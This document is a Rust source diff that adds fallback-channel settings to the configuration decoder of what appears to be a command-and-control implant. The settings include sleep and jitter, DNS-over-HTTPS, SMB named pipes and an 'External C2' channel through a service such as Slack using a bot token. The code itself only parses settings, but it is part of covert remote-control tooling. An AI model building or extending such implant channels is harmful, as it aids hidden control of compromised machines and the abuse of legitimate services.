@@ -33,6 +33,19 @@ pub struct Config {
     pub sleep_seconds: u32,
     pub jitter_pct: u8,
     pub use_tls: bool,
+    // ---- Channel dispatcher config (spec-1) ----
+    /// Primary channel (Channel enum u8 value). Default 0 = Https.
+    pub primary_channel: u8,
+    /// Fallback bitmap: bit N set = Channel N is in the fallback chain.
+    pub fallback_bitmap: u8,
+    /// DoH resolver host (e.g. "cloudflare-dns.com"). Empty = not configured.
+    pub doh_resolver: String,
+    /// SMB pipe path (e.g. `\\.\pipe\nyx_abc`). Empty = not configured.
+    pub smb_pipe_name: String,
+    /// External C2 API host (e.g. "slack.com"). Empty = not configured.
+    pub extc2_api_host: String,
+    /// External C2 token (bot token / webhook secret). Empty = not configured.
+    pub extc2_token: String,
 }
 
 mod baked {
@@ -93,6 +106,29 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
     let sleep_seconds = r.u32()?;
     let jitter_pct = r.u8()?;
     let use_tls_byte = r.u8()?;
+    // Channel dispatcher fields (spec-1). These are appended after the
+    // original fields. Old configs (build-time or unpatched .nyx_cfg) stop
+    // after use_tls — `remaining()==0` → default to Https-only with empty
+    // channel params. This is fully backward-compatible.
+    let (primary_channel, fallback_bitmap, doh_resolver, smb_pipe_name, extc2_api_host, extc2_token) =
+        if r.remaining() > 0 {
+            let primary_channel = r.u8().unwrap_or(0);
+            let fallback_bitmap = r.u8().unwrap_or(0);
+            let doh_resolver = r.str().unwrap_or_default();
+            let smb_pipe_name = r.str().unwrap_or_default();
+            let extc2_api_host = r.str().unwrap_or_default();
+            let extc2_token = r.str().unwrap_or_default();
+            (
+                primary_channel,
+                fallback_bitmap,
+                doh_resolver,
+                smb_pipe_name,
+                extc2_api_host,
+                extc2_token,
+            )
+        } else {
+            (0, 0, String::new(), String::new(), String::new(), String::new())
+        };
     Ok(Config {
         server_host,
         server_port,
@@ -101,5 +137,11 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
         sleep_seconds,
         jitter_pct,
         use_tls: use_tls_byte != 0,
+        primary_channel,
+        fallback_bitmap,
+        doh_resolver,
+        smb_pipe_name,
+        extc2_api_host,
+        extc2_token,
     })
 }
